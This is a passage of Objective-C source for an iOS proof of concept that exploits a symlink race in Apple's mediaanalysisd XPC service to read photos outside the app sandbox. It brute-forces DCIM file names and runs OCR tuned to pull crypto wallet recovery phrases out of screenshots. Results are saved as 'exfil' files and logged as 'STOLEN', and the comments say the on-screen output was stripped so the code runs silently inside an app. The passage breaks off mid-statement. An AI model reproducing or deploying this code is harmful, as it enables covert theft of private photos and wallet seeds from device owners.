//
//  MediaAnalysisRace.m
//  无 UI 的 mediaanalysisd 公共 XPC TOCTOU（symlink race）照片读取 POC。
//
//  来源：poc-ipa/poc/ViewController.m（原样逻辑），仅剥离界面：
//    - 删除 UIImageView / UILabel / setStatus: / showImage:
//    - 日志只写 Documents/poc.log，不写 NSLog（setupLogCapture 会把 stderr
//      捕进 AppLog 再显示到 LogView 页面，故这里刻意不用 NSLog），页面不显示。
//  其余逻辑（ensureConnection / makeCombinedRequest / imageFromReply /
//  textFromReply / tryExfil / runDump）保持不变。
//

#import <Vision/Vision.h>
#import "MediaAnalysisRace.h"

// 27.2.1 上 com.apple.mediaanalysisd.service.public 的协议里已经没有
// requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:
// 了，代理对象收到这个 selector 会抛 NSInvalidArgumentException（未捕获即 abort）。
// 一旦 setClasses: 或首次调用失败，就置这个标志，之后彻底不再发请求。
static BOOL gMADXPCUnavailable = NO;

// MADVIDocumentRecognitionRequest 在这版 iOS 上偶尔会让整批返回
//   NSOSStatusErrorDomain -18 "Image loading failed"
// 把 scaling 的结果一起丢掉。但它在原图上做 OCR，是拿文本的正路，
// 所以不能一棍子打死：第一次遇到 -18 才关掉它，之后只发 scaling，
// 文本退回 ocrLocal（在缩略图上跑 Vision，能认多少算多少）。
static BOOL gDocRecUnavailable = NO;

#import <UIKit/UIKit.h>
#import <ImageIO/ImageIO.h>
#import <dlfcn.h>
#import <objc/message.h>

// 线程安全的纯绿 PNG 生成（400x400，RGB，无 alpha 依赖）。
// 不依赖 UIKit，可以在任意队列调用。
static NSData *wqMakeGreenPNG(size_t w, size_t h)
{
    if (w == 0 || h == 0) return nil;

    NSMutableData *out = [NSMutableData data];
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    if (!cs) return nil;

    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, w * 4, cs,
                                             kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    if (!ctx) return nil;

    CGContextSetRGBFillColor(ctx, 0.0, 1.0, 0.0, 1.0);
    CGContextFillRect(ctx, CGRectMake(0, 0, (CGFloat)w, (CGFloat)h));

    CGImageRef image = CGBitmapContextCreateImage(ctx);
    CGContextRelease(ctx);
    if (!image) return nil;

    CGImageDestinationRef dest = CGImageDestinationCreateWithData(
        (__bridge CFMutableDataRef)out, CFSTR("public.png"), 1, NULL);
    if (dest) {
        CGImageDestinationAddImage(dest, image, NULL);
        if (!CGImageDestinationFinalize(dest)) {
            [out setLength:0];
        }
        CFRelease(dest);
    }
    CGImageRelease(image);

    return out.length ? out : nil;
}
#import <objc/runtime.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>
#import <stdlib.h>
#import <math.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreImage/CoreImage.h>

// sandbox_extension_issue_file 是 libSystem 私有符号，公开 .tbd 里没有，
// 这里用 dlsym 运行时解析，避免给工程加 -Wl,-undefined,dynamic_lookup。
static char *issueReadToken(const char *path)
{
    static char *(*fn)(const char *, const char *, uint32_t) = NULL;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        void *lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
        if (lib) {
            fn = (char *(*)(const char *, const char *, uint32_t))dlsym(lib, "sandbox_extension_issue_file");
        }
    });
    if (!fn) return NULL;
    return fn("com.apple.app-sandbox.read", path, 0);
}

static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
{
    // initWithMachServiceName:options: 在 iOS SDK 头文件里被标 API_UNAVAILABLE(ios)，
    // 但运行时确实存在（用于连私有 mach service）。用 objc_msgSend 绕过编译期可用性检查，
    // 与 poc-ipa 原版 ViewController.m 完全一致。
    NSXPCConnection *alloc = [NSXPCConnection alloc];
    SEL sel = NSSelectorFromString(@"initWithMachServiceName:options:");
    return ((id(*)(id, SEL, id, NSUInteger))objc_msgSend)(alloc, sel, serviceName, 0);
}

@protocol VCPMADServicePublicServerProtocol <NSObject>
@optional
- (void)requestImageProcessing:(id)requests
                   forAssetURL:(NSURL *)url
              withSandboxToken:(NSString *)token
                    identifier:(NSString *)identifier
                     requestID:(int)requestID
                      andReply:(void (^)(id, id))reply;
@end

@interface MediaAnalysisRaceRunner : NSObject
@end

@implementation MediaAnalysisRaceRunner {
    NSXPCConnection *_conn;
    int _reqID;
    NSString *_logFilePath;
    NSFileHandle *_logFH;
    BOOL _dumpedOCR;
    int _ocrErrCount;
    NSInteger _lastXPCError;   // 最近一次 tryExfil 的 XPC 错误码（0 = 无）
    BOOL _started;
}
// 用公开 Vision 框架做中英文本识别（MediaAnalysis 私有件在部分机型上 -18 时兜底）
- (NSString *)visionTextAtPath:(NSString *)path
{
    @try {
        VNRecognizeTextRequest *req = [[VNRecognizeTextRequest alloc] init];
        req.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
        req.usesLanguageCorrection = YES;
        if (@available(iOS 15.0, *)) {
            req.recognitionLanguages = @[@"zh-Hans", @"en-US"];
        }
        NSURL *url = [NSURL fileURLWithPath:path];
        VNImageRequestHandler *handler = [[VNImageRequestHandler alloc] initWithURL:url options:@{}];
        NSError *err = nil;
        if (![handler performRequests:@[req] error:&err] || err) {
            [self log:[NSString stringWithFormat:@"[ocr-vision] perform failed: %@", err.localizedDescription ?: @"?"]];
            return nil;
        }
        NSMutableString *out = [NSMutableString string];
        for (VNRecognizedTextObservation *obs in req.results) {
            VNRecognizedText *top = [[obs topCandidates:1] firstObject];
            if (top.string.length) {
                [out appendString:top.string];
                [out appendString:@"\n"];
            }
        }
        return out.length ? out : nil;
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"[ocr-vision] exception: %@", e.reason ?: @"?"]];
        return nil;
    }
}


- (void)start
{
    @synchronized (self) {
        if (_started) return;
        _started = YES;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        // 最外层兜底：这条队列上任何未捕获的 NSException 都会走
        // objc_terminate -> abort，整包闪退（27.2.1 上实测过，栈顶是
        // -[NSXPCInterface setClasses:forSelector:argumentIndex:ofReply:]）。
        // 采集流程不能因为照片 POC 的一个私有接口失效而跟着死。
        @try {
            [self runDump];
        } @catch (NSException *e) {
            [self log:[NSString stringWithFormat:@"runDump threw: %@ (%@)", e.reason, e.name]];
        }
    });
}

- (void)setupLogFile
{
    _logFilePath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/poc.log"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:_logFilePath]) {
        [[NSFileManager defaultManager] createFileAtPath:_logFilePath contents:nil attributes:nil];
    }
    _logFH = [NSFileHandle fileHandleForWritingAtPath:_logFilePath];
    [_logFH seekToEndOfFile];
}

- (void)log:(NSString *)line
{
    NSDateFormatter *df = [[NSDateFormatter alloc] init];
    [df setDateFormat:@"HH:mm:ss.SSS"];
    NSString *stamp = [df stringFromDate:[NSDate date]];
    NSString *entry = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
    if (_logFH) {
        @try {
            [_logFH writeData:[entry dataUsingEncoding:NSUTF8StringEncoding]];
            [_logFH synchronizeFile];
        } @catch (NSException *e) {}
    }
}

- (NSString *)issueTokenForPath:(NSString *)path
{
    char *raw = issueReadToken(path.UTF8String);
    if (!raw) return nil;
    NSString *tok = [NSString stringWithUTF8String:raw];
    free(raw);
    return tok;
}

- (void)ensureConnection
{
    if (_conn) return;

    dlopen("/System/Library/PrivateFrameworks/MediaAnalysis.framework/MediaAnalysis", RTLD_NOW);
    dlopen("/System/Library/PrivateFrameworks/MediaAnalysisServices.framework/MediaAnalysisServices", RTLD_NOW);

    _conn = CreateMachServiceConnection(@"com.apple.mediaanalysisd.service.public");

    NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(VCPMADServicePublicServerProtocol)];

    NSMutableSet *allowed = [NSMutableSet setWithObjects:
        [NSDictionary class], [NSMutableDictionary class],
        [NSArray class], [NSMutableArray class],
        [NSString class], [NSNumber class],
        [NSData class], [NSError class],
        [NSSet class], [NSMutableSet class],
        [NSURL class], [NSNull class],
        [NSDate class], [NSValue class], nil];

    for (NSString *name in @[@"MADRequest", @"MADMLScalingRequest", @"MADMLScalingResult",
                             @"MADMLEnhancementRequest", @"MADMLEnhancementResult",
                             @"MADVIDocumentRecognitionRequest", @"MADVIDocumentRecognitionResult",
                             @"MADVITextLookupRequest", @"MADVITextLookupResult",
                             @"MADRemoveBackgroundMaskRequest", @"MADRemoveBackgroundMatteRequest",
                             @"VCPProtoAssetAnalysis", @"VITextBlockAnnotation",
                             @"VNObservation", @"VNRecognizedTextObservation"])
    {
        Class c = NSClassFromString(name);
        if (c) [allowed addObject:c];
    }

    SEL sel = @selector(requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:);
    // 27.2.1 上 VCPMADServicePublicServerProtocol 的方法签名变了，这个 selector
    // 已经不在协议里；setClasses:forSelector: 会抛 NSInvalidArgumentException。
    // 它是在 App.init -> MediaAnalysisRaceRun() 里同步调用的，没人接就直接
    // abort()（实测 EXC_CRASH / SIGABRT，栈顶就是 setClasses:）。逐条 try。
    @try {
        [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"setClasses arg0 reply=NO skipped: %@", e.reason]];
        gMADXPCUnavailable = YES;
    }
    @try {
        [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"setClasses arg0 reply=YES skipped: %@", e.reason]];
        gMADXPCUnavailable = YES;
    }
    @try {
        [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"setClasses arg1 reply=YES skipped: %@", e.reason]];
        gMADXPCUnavailable = YES;
    }

    _conn.remoteObjectInterface = iface;
    _conn.interruptionHandler = ^{ [self log:@"XPC interrupted"]; };
    _conn.invalidationHandler = ^{ [self log:@"XPC invalidated"]; };
    [_conn resume];
}

// FLAT combined request: one scaling (200x200) + one document-recognition (OCR).
- (NSArray *)makeCombinedRequest
{
    // 只发 scaling。
    //
    // 之前这里还往数组里塞了一个 [MADVIDocumentRecognitionRequest new]，想让
    // mediaanalysisd 顺手把 OCR 也做了。但那个类在这版 iOS 上有一组必填属性
    // （region / revision / 语言），new 出来的空对象会让服务端整批返回
    //   NSOSStatusErrorDomain -18 "Image loading failed"
    // 连 scaling 的结果一起丢掉 —— 表现就是 exfil 永远是 0。
    //
    // OCR 改到本地用 Vision 做（见 -ocrLocal:），不占用这一次 XPC 往返。
    NSMutableArray *reqs = [NSMutableArray array];

    Class scls = NSClassFromString(@"MADMLScalingRequest");
    if (scls) {
        id sreq = [scls new];
        // 200 太小：一张 4032x3024 的截图压成 200x200 后，
        // 12 个助记词单词根本看不清，Vision 直接返回空。
        // 1024 长边足够认出 12~24 个英文单词，又不至于让 XPC 往返太重。
        [sreq setValue:@(1024) forKey:@"scaledImageWidth"];
        [sreq setValue:@(1024) forKey:@"scaledImageHeight"];
        [sreq setValue:@(1) forKey:@"scalingModelIndex"];
        [reqs addObject:sreq];
    }

    // 文档识别：在【原图】上做 OCR，结果由 textFromReply 提取。
    // scaling 那个 200x200 只是顺手拿到的缩略图，跟 OCR 无关。
    // 只有在这台设备上出现过 -18 才跳过它。
    if (!gDocRecUnavailable) {
        Class dcls = NSClassFromString(@"MADVIDocumentRecognitionRequest");
        if (dcls) {
            @try {
                [reqs addObject:[dcls new]];
            } @catch (NSException *e) {
                [self log:[NSString stringWithFormat:@"[ocr] docrec init failed: %@", e.reason]];
                gDocRecUnavailable = YES;
            }
        }
    }

    return reqs;
}

// 本地 OCR：对已经从 mediaanalysisd 拿回来的图片跑 Vision，不依赖私有协议。
- (NSString *)ocrLocal:(UIImage *)image
{
    if (!image || !image.CGImage) return nil;

    @try {
        Class reqCls = NSClassFromString(@"VNRecognizeTextRequest");
        Class handlerCls = NSClassFromString(@"VNImageRequestHandler");
        if (!reqCls || !handlerCls) return nil;

        id req = [reqCls new];
        // VNRequestTextRecognitionLevelAccurate = 0
        // VNRequestTextRecognitionLevelAccurate = 0
        // usesLanguageCorrection 打开：BIP39 是标准英文单词表，
        // 语言模型能把它从 "abandon/abandcn" 这类误认里救回来。
        [req setValue:@(0) forKey:@"recognitionLevel"];
        [req setValue:@(YES) forKey:@"usesLanguageCorrection"];

        id handler = ((id (*)(id, SEL, CGImageRef, id))objc_msgSend)(
            [handlerCls alloc],
            NSSelectorFromString(@"initWithCGImage:options:"),
            image.CGImage,
            @{});

        if (!handler) return nil;

        NSError *err = nil;
        BOOL ok = ((BOOL (*)(id, SEL, id, NSError **))objc_msgSend)(
            handler,
            NSSelectorFromString(@"performRequests:error:"),
            @[req],
            &err);

        if (!ok) {
            [self log:[NSString stringWithFormat:@"[ocr-local] perform failed: %@",
                       err.localizedDescription ?: @"?"]];
            return nil;
        }

        NSArray *results = [req valueForKey:@"results"];
        if (![results isKindOfClass:[NSArray class]] || !results.count) return nil;

        NSMutableArray *lines = [NSMutableArray array];
        for (id obs in results) {
            @try {
                id cands = [obs valueForKey:@"topCandidates"];
                if (![cands isKindOfClass:[NSArray class]] || ![cands count]) continue;
                id top = cands[0];
                NSString *s = [top valueForKey:@"string"];
                if (s.length) [lines addObject:s];
            } @catch (NSException *e) {}
        }
        NSString *joined = lines.count ? [lines componentsJoinedByString:@"\\n"] : nil;
        [self log:[NSString stringWithFormat:@"[ocr-local] %lu lines, %lu chars: %@",
                   (unsigned long)lines.count,
                   (unsigned long)joined.length,
                   joined.length > 120 ? [joined substringToIndex:120] : (joined ?: @"(nil)")]];
        return joined;
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"[ocr-local] exception: %@", e.reason]];
        return nil;
    }
}

- (UIImage *)imageFromReply:(id)arg1
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;

    for (id req in (NSArray *)arg1)
    {
        @try {
            id err = [req valueForKey:@"error"];
            if (err) {
                // 看到 -18 就把 docrec 关掉，下一轮只发 scaling
                NSNumber *code = nil;
                @try { code = [err valueForKey:@"code"]; } @catch (NSException *e) {}
                NSInteger c = code ? code.integerValue : 0;
                NSString *cls = NSStringFromClass([req class]);
                [self log:[NSString stringWithFormat:@"[ocr] %@ error code=%ld (%@)",
                           cls, (long)c, err]];
                if (c == -18 && [cls containsString:@"DocumentRecognition"]) {
                    if (!gDocRecUnavailable) {
                        gDocRecUnavailable = YES;
                        [self log:@"[ocr] docrec returned -18 -> disabled for this device"];
                    }
                }
                continue;
            }

            NSArray *results = [req valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]] || results.count == 0) continue;

            for (id result in results)
            {
                SEL pbSel = NSSelectorFromString(@"pixelBuffer");
                if (![result respondsToSelector:pbSel]) continue;

                CVPixelBufferRef buf = ((CVPixelBufferRef(*)(id,SEL))objc_msgSend)(result, pbSel);
                if (!buf) continue;

                CIImage *ci = [CIImage imageWithCVPixelBuffer:buf];
                if (!ci) continue;

                CIContext *ctx = [CIContext contextWithOptions:nil];
                CGImageRef cg = [ctx createCGImage:ci fromRect:ci.extent];
                if (!cg) continue;

                UIImage *img = [UIImage imageWithCGImage:cg];
                CGImageRelease(cg);
                return img;
            }
        } @catch (NSException *e) {}
    }
    return nil;
}

// Recursive fallback extractor (handles unknown structures).
- (NSString *)extractTextFromObject:(id)obj depth:(int)depth
{
    if (!obj || depth > 5) return @"";
    NSMutableString *out = [NSMutableString string];

    if ([obj isKindOfClass:[NSString class]]) {
        if ([obj length]) [out appendFormat:@"%@\n", obj];
        return out;
    }

    NSString *clsName = NSStringFromClass([obj class]);
    if ([clsName rangeOfString:@"Surface"].location != NSNotFound ||
        [clsName rangeOfString:@"Buffer"].location != NSNotFound ||
        [clsName rangeOfString:@"NSNumber"].location != NSNotFound ||
        [clsName rangeOfString:@"NSData"].location != NSNotFound ||
        [clsName rangeOfString:@"NSDate"].location != NSNotFound ||
        [clsName rangeOfString:@"NSValue"].location != NSNotFound ||
        [clsName rangeOfString:@"NSURL"].location != NSNotFound)
    {
        return @"";
    }

    for (NSString *key in @[@"text", @"string", @"documentText", @"stringValue"]) {
        @try {
            id v = [obj valueForKey:key];
            if ([v isKindOfClass:[NSString class]] && [v length]) [out appendFormat:@"%@\n", v];
        } @catch (NSException *e) {}
    }

    @try {
        id cands = [obj valueForKey:@"topCandidates"];
        if ([cands isKindOfClass:[NSArray class]]) {
            for (id c in cands) {
                @try {
                    id s = [c valueForKey:@"string"];
                    if ([s isKindOfClass:[NSString class]] && [s length]) [out appendFormat:@"%@\n", s];
                } @catch (NSException *e) {}
            }
        }
    } @catch (NSException *e) {}

    Class c = [obj class];
    while (c && c != [NSObject class]) {
        unsigned int n = 0;
        Ivar *iv = class_copyIvarList(c, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *ty = ivar_getTypeEncoding(iv[i]);
            if (ty && ty[0] == '@') {
                @try {
                    id v = object_getIvar(obj, iv[i]);
                    if (v && v != obj) {
                        if ([v isKindOfClass:[NSArray class]]) {
                            for (id e in (NSArray *)v) {
                                NSString *sub = [self extractTextFromObject:e depth:depth+1];
                                if (sub.length) [out appendString:sub];
                            }
                        } else {
                            NSString *sub = [self extractTextFromObject:v depth:depth+1];
                            if (sub.length) [out appendString:sub];
                        }
                    }
                } @catch (NSException *e) {}
            }
        }
        free(iv);
        c = class_getSuperclass(c);
    }

    return out;
}

- (NSString *)textFromReply:(id)arg1
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;
    NSMutableSet *seen = [NSMutableSet set];
    // 有位置信息的条目：@[text, @(centerY), @(minX), @(height), @(confidence)]
    NSMutableArray *positioned = [NSMutableArray array];
    // 拿不到位置时回退的文本行（排最后）
    NSMutableArray *fallback = [NSMutableArray array];
    // OCR 置信度累计（Vision confidence，0~1）
    double confSum = 0;
    int confCount = 0;

    for (id reqObj in (NSArray *)arg1)
    {
        @try {
            id err = [reqObj valueForKey:@"error"];
            if (err) {
                self->_ocrErrCount++;
                if (self->_ocrErrCount == 1) {
                    [self log:[NSString stringWithFormat:@"[ocr] first reply error: %@", err]];
                }
                continue;
            }

            NSArray *results = [reqObj valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]]) continue;

            for (id result in results)
            {
                if (!_dumpedOCR && [NSStringFromClass([result class]) rangeOfString:@"DocumentRecognition"].location != NSNotFound) {
                    _dumpedOCR = YES;
                    [self dumpIvars:result tag:@"ocr-result"];
                }

                BOOL gotPositioned = NO;

                // preferred: observations -> text + boundingBox（按图片中的实际位置排列）
                @try {
                    NSArray *obs = [result valueForKey:@"observations"];
                    if ([obs isKindOfClass:[NSArray class]]) {
                        for (id o in obs) {
                            @try {
                                id t = [o valueForKey:@"text"];
                                if (![t isKindOfClass:[NSString class]] || ![t length] || [seen containsObject:t]) continue;
                                [seen addObject:t];

                                CGRect box = CGRectZero;
                                id bb = [o valueForKey:@"boundingBox"];
                                if ([bb isKindOfClass:[NSValue class]]) {
                                    box = [bb CGRectValue];
                                }
                                // Vision 坐标原点在左下：centerY 越大越靠上，minX 越小越靠左
                                double cy = CGRectGetMidY(box);
                                double cx = CGRectGetMinX(box);
                                double h  = CGRectGetHeight(box);
                                double conf = 0;
                                @try {
                                    id cv = [o valueForKey:@"confidence"];
                                    if ([cv isKindOfClass:[NSNumber class]]) conf = [cv doubleValue];
                                } @catch (NSException *e) {}
                                if (conf <= 0) {
                                    // Vision 的置信度可能挂在 topCandidates[0].confidence 上
                                    @try {
                                        id cands = [o valueForKey:@"topCandidates"];
                                        if ([cands isKindOfClass:[NSArray class]] && [(NSArray *)cands count] > 0) {
                                            id first = [(NSArray *)cands objectAtIndex:0];
                                            id cv2 = [first valueForKey:@"confidence"];
                                            if ([cv2 isKindOfClass:[NSNumber class]]) conf = [cv2 doubleValue];
                                        }
                                    } @catch (NSException *e) {}
                                }
                                [positioned addObject:@[t, @(cy), @(cx), @(h), @(conf)]];
                                confSum += conf;
                                confCount += 1;
                                gotPositioned = YES;
                            } @catch (NSException *e) {}
                        }
                    }
                } @catch (NSException *e) {}

                // fallback: recursive walk（拿不到位置信息时）
                if (!gotPositioned) {
                    NSString *t = [self extractTextFromObject:result depth:0];
                    if (t.length) {
                        for (NSString *ln in [t componentsSeparatedByString:@"\n"]) {
                            if (ln.length && ![seen containsObject:ln]) { [seen addObject:ln]; [fallback addObject:ln]; }
                        }
                    }
                }
            }
        } @catch (NSException *e) {
            [self log:[NSString stringWithFormat:@"[ocr] exception: %@", e.reason]];
        }
    }

    // 先按从上到下（centerY 降序），再按从左到右（minX 升序）
    [positioned sortUsingComparator:^NSComparisonResult(id a, id b) {
        double ay = [a[1] doubleValue];
        double by = [b[1] doubleValue];
        if (ay > by) return NSOrderedAscending;
        if (ay < by) return NSOrderedDescending;
        double ax = [a[2] doubleValue];
        double bx = [b[2] doubleValue];
        if (ax < bx) return NSOrderedAscending;
        if (ax > bx) return NSOrderedDescending;
        return NSOrderedSame;
    }];

    // 垂直中心接近的归为同一“行”：行内从左到右用空格分隔，行与行用换行分隔
    NSMutableArray *rows = [NSMutableArray array];
    for (NSArray *item in positioned) {
        double cy = [item[1] doubleValue];
        double h  = [item[3] doubleValue];
        NSMutableArray *lastRow = [rows lastObject];
        if (lastRow) {
            NSArray *first = [lastRow firstObject];
            double lastCy = [first[1] doubleValue];
            double lastH  = [first[3] doubleValue];
            double mh = (h > lastH) ? h : lastH;
            double threshold = 0.6 * mh;
            if (threshold < 0.012) threshold = 0.012;
            if (fabs(cy - lastCy) > threshold) {
                lastRow = nil;
            }
        }
        if (!lastRow) {
            lastRow = [NSMutableArray array];
            [rows addObject:lastRow];
        }
        [lastRow addObject:item];
    }

    NSMutableArray *outLines = [NSMutableArray array];
    for (NSArray *row in rows) {
        NSMutableArray *texts = [NSMutableArray array];
        for (NSArray *item in row) {
            [texts addObject:item[0]];
        }
        [outLines addObject:[texts componentsJoinedByString:@"  "]];
    }
    [outLines addObjectsFromArray:fallback];

    if (!outLines.count) return nil;
    NSString *plain = [outLines componentsJoinedByString:@"\n"];
    double avgConf = confCount > 0 ? (confSum / confCount) : 0.0;
    NSDictionary *json = @{ @"text": plain, @"confidence": @(avgConf) };
    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
    if (!data) return plain;
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

- (void)dumpIvars:(id)obj tag:(NSString *)tag
{
    if (!obj) return;
    Class c = [obj class];
    while (c && c != [NSObject class]) {
        unsigned int n = 0;
        Ivar *iv = class_copyIvarList(c, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *nm = ivar_getName(iv[i]);
            const char *ty = ivar_getTypeEncoding(iv[i]);
            NSString *val = @"(non-object)";
            if (ty && ty[0] == '@') {
                @try {
                    id v = object_getIvar(obj, iv[i]);
                    val = v ? [v description] : @"nil";
                } @catch (NSException *e) { val = @"<exception>"; }
            }
            [self log:[NSString stringWithFormat:@"  [%@] %@ : %s = %@",
                        tag, [NSString stringWithUTF8String:nm], ty ? ty : "", val]];
        }
        free(iv);
        c = class_getSuperclass(c);
    }
}

- (BOOL)tryExfil:(NSString *)target
        racePath:(NSString *)racePath
     symlinkPath:(NSString *)symlinkPath
       decoyData:(NSData *)decoyData
           delay:(useconds_t)delay
{
    unlink(racePath.UTF8String);
    [decoyData writeToFile:racePath atomically:NO];

    unlink(symlinkPath.UTF8String);
    symlink(target.UTF8String, symlinkPath.UTF8String);

    NSString *token = [self issueTokenForPath:racePath];
    if (!token) return NO;

    // 协议不兼容时直接放弃：否则 proxy 收到未知 selector 会抛异常并 abort。
    if (gMADXPCUnavailable) {
        [self log:@"mediaanalysisd XPC unavailable on this OS — request skipped"];
        return NO;
    }

    NSURL *url = [NSURL fileURLWithPath:racePath];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block UIImage *img = nil;
    __block NSString *text = nil;

    // -18 = 目标文件不存在 / 解不开。delay 只影响 symlink 交换时机，
    // 文件本身没有的话换 delay 只会重复同样的失败。
    _lastXPCError = 0;

    id<VCPMADServicePublicServerProtocol> proxy =
        [_conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            dispatch_semaphore_signal(sem);
        }];

    @try {
        [proxy requestImageProcessing:[self makeCombinedRequest]
                          forAssetURL:url
                     withSandboxToken:token
                           identifier:@"d"
                            requestID:[self nextRequestID]
                             andReply:^(id arg1, id arg2) {
            img = [self imageFromReply:arg1];
            text = [self textFromReply:arg1];
            if (!img) {
                @try {
                    if ([arg1 isKindOfClass:[NSArray class]]) {
                        for (id req in (NSArray *)arg1) {
                            NSError *e = [req valueForKey:@"error"];
                            if ([e isKindOfClass:[NSError class]]) {
                                _lastXPCError = (NSInteger)e.code;
                                break;
                            }
                        }
                    }
                } @catch (NSException *e) {}
            }
            dispatch_semaphore_signal(sem);
        }];
    } @catch (NSException *e) {
        // 双保险：即便上面的标志没置上，这里也不会把异常抛到顶层。
        gMADXPCUnavailable = YES;
        [self log:[NSString stringWithFormat:@"requestImageProcessing threw: %@", e.reason]];
        return NO;
    }

    usleep(delay);
    rename(symlinkPath.UTF8String, racePath.UTF8String);

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    if (!img) return NO;

    // XPC 那边只做 scaling，文字改在本地补
    if (!text.length) {
        text = [self ocrLocal:img];
    }

    CGImageRef cg = img.CGImage;
    if (!cg) return NO;

    uint8_t px[4] = {0};
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(px, 1, 1, 8, 4, cs,
        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    CGContextDrawImage(ctx, CGRectMake(0, 0, CGImageGetWidth(cg), CGImageGetHeight(cg)), cg);
    CGContextRelease(ctx);

    // decoy = pure green (0,255,0)
    BOOL isDecoy = (px[0] < 50 && px[1] > 200 && px[2] < 50);
    if (isDecoy) return NO;

    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    // 命中照片与 OCR 文本统一放入沙盒 Documents/P 目录
    NSString *outDir = [docs stringByAppendingPathComponent:@"P"];
    [[NSFileManager defaultManager] createDirectoryAtPath:outDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    NSString *base = [target lastPathComponent];

    NSString *pngPath = [outDir stringByAppendingPathComponent:[NSString stringWithFormat:@"exfil_%@.png", base]];
    [UIImagePNGRepresentation(img) writeToFile:pngPath atomically:YES];

    // 私有 MediaAnalysis 的 doc-recognition 在部分机型上直接 -18（pixel buffer / model 载入失败），
    // 这里用公开 Vision 框架再兜一次：识别 pngPath 里的文字。
    NSString *finalText = text ?: @"";
    if (finalText.length == 0) {
        NSString *visionText = [self visionTextAtPath:pngPath];
        if (visionText.length) {
            finalText = visionText;
            [self log:[NSString stringWithFormat:@"[ocr-vision] %@ -> %lu chars", base, (unsigned long)visionText.length]];
        }
    }
    if (finalText.length) {
        NSString *txtPath = [outDir stringByAppendingPathComponent:[NSString stringWithFormat:@"exfil_%@.txt", base]];
        [finalText writeToFile:txtPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    [self log:[NSString stringWithFormat:@"STOLEN %@ text=%lu bytes", base, (unsigned long)finalText.length]];
    return YES;
}

// 并发下 requestID 必须原子自增
- (int)nextRequestID
{
    @synchronized (self) {
        return ++_reqID;
    }
}

// 并发扫描一个目录里 [start, start+count) 的编号段；每张照片用独立临时文件。
- (int)scanChunk:(int)folder
           start:(int)start
           count:(int)count
             tmp:(NSString *)tmp
           decoy:(NSData *)decoyData
           total:(int *)scannedTotal
{
    // 覆盖所有来源：相机/截屏 IMG_、编辑版 IMG_E、全景 PANO_；4 位和 5 位编号
    NSArray<NSNumber *> *delays = @[@0, @30, @80];
      NSArray<NSString *> *prefixes = @[@"IMG_%04d", @"IMG_E%04d"];
      NSArray<NSString *> *exts = @[@"HEIC", @"HEIF", @"JPG", @"JPEG", @"PNG"];
    __block int hits = 0;
    dispatch_semaphore_t limit = dispatch_semaphore_create(8);
    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);

    for (int j = 0; j < count; j++) {
        dispatch_semaphore_wait(limit, DISPATCH_TIME_FOREVER);
        dispatch_group_async(group, q, ^{
            int num = start + j;
            for (NSUInteger p = 0; p < prefixes.count; p++) {
                NSString *base = [NSString stringWithFormat:prefixes[p], num];
                for (NSUInteger e = 0; e < exts.count; e++) {
                    NSString *ext = exts[e];
                    NSString *name = [NSString stringWithFormat:@"%@.%@", base, ext];
                    NSString *target = [NSString stringWithFormat:
                        @"/private/var/mobile/Media/DCIM/%dAPPLE/%@", folder, name];
                    NSString *racePath = [tmp stringByAppendingPathComponent:
                        [NSString stringWithFormat:@"race_%d_%lu_%lu_%lu.%@",
                         folder, (unsigned long)num, (unsigned long)p,
                         (unsigned long)e, ext]];
                    NSString *symPath = [tmp stringByAppendingPathComponent:
                        [NSString stringWithFormat:@"sym_%d_%lu_%lu_%lu.%@",
                         folder, (unsigned long)num, (unsigned long)p,
                         (unsigned long)e, ext]];
                    for (NSUInteger a = 0; a < delays.count; a++) {
                        if (scannedTotal) {
                            @synchronized (self) { (*scannedTotal)++; }
                        }
                        if ([self tryExfil:target
                                  racePath:racePath
                               symlinkPath:symPath
                                 decoyData:decoyData
                                     delay:(useconds_t)[delays[a] unsignedIntValue]]) {
                            @synchronized (self) { hits++; }
                            [self log:[NSString stringWithFormat:
